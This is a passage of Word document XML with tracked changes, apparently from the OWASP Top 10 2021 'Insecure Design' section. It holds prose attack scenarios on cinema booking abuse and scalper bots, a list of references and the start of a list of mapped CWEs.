    <w:p w14:paraId="548D168C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1652" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1653" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>are prohibited. Such code should be removed and replaced with a more</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="43A6E761" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1654" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1655" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>secure design.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="75074B01" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveTo w:id="1656" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveToRangeStart w:id="1657" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923168"/>
    </w:p>
    <w:p w14:paraId="33D54C3E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1658" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveTo w:id="1659" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>**Scenario #</w:t>
        </w:r>
      </w:moveTo>
      <w:moveToRangeEnd w:id="1657"/>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="1660" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>2:*</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>* A cinema chain allows group booking discounts and has a</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="18DAA923" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1661" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1662" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>maximum of fifteen attendees before requiring a deposit. Attackers could</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1797698D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1663" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1664" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>threat model this flow and test if they could book six hundred seats and</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="26B904CA" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1665" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1666" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>all cinemas at once in a few requests, causing a massive loss of income.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="22F98690" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveTo w:id="1667" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveToRangeStart w:id="1668" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923172"/>
    </w:p>
    <w:p w14:paraId="59ABF93C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1669" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveTo w:id="1670" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00AC649A">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>**Scenario #</w:t>
        </w:r>
      </w:moveTo>
      <w:moveToRangeEnd w:id="1668"/>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="1671" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>3:*</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>* A retail chain’s e-commerce website does not have</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3585521B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1672" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1673" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>protection against bots run by scalpers buying high-end video cards to</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="56ABB172" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1674" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1675" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>resell auction websites. This creates terrible publicity for the video</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="13C341E0" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1676" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1677" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>card makers and retail chain owners and enduring bad blood with</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="44C2F196" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1678" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1679" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>enthusiasts who cannot obtain these cards at any price. Careful anti-bot</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="05BADEB6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1680" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1681" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>design and domain logic rules, such as purchases made within a few</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6CFEB013" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1682" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1683" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>seconds of availability, might identify inauthentic purchases and</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="01B5BF71" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1684" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1685" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>rejected such transactions.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="347E1350" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1686" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63B7C5EB" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveTo w:id="1687" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveToRangeStart w:id="1688" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923169"/>
      <w:moveTo w:id="1689" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## References</w:t>
        </w:r>
      </w:moveTo>
    </w:p>
    <w:p w14:paraId="1C30C1C2" w14:textId="77777777" w:rsidR="00B74248" w:rsidRPr="00841D1E" w:rsidRDefault="00B74248" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveTo w:id="1690" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:moveToRangeEnd w:id="1688"/>
    <w:p w14:paraId="1585ECD9" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1691" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1692" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [OWASP Cheat Sheet: Secure Product </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Design](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cheatsheetseries.owasp.org/cheatsheets/Secure_Product_Design_Cheat_Sheet.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4DDBEB3E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1693" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1694" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [OWASP </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>SAMM::</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> Design Security Architecture](https://owaspsamm.org/model/design/security-architecture/) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="08DC7C06" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1695" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1696" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [OWASP </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>SAMM::</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> Design Threat Assessment](https://owaspsamm.org/model/design/threat-assessment/)  </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0D8EA522" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1697" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1698" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [NIST – Guidelines on Minimum Standards for Developer Verification of </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Software](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://www.nist.gov/publications/guidelines-minimum-standards-developer-verification-software) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3461D09C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1699" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1700" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [The Threat Modeling </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Manifesto](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>https://threatmodelingmanifesto.org) -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="278CC08C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1701" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1702" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [Awesome Threat </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Modeling](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>https://github.com/hysnsec/awesome-threat-modelling) -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5DC38676" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1703" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="310A4146" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1704" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1705" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## List of Mapped CWEs</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7176DD30" w14:textId="77777777" w:rsidR="00B74248" w:rsidRPr="00841D1E" w:rsidRDefault="00B74248" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1706" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78107491" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1707" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1708" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-73: External Control of File Name or </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Path](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/73.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2A54E1E0" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1709" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1710" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
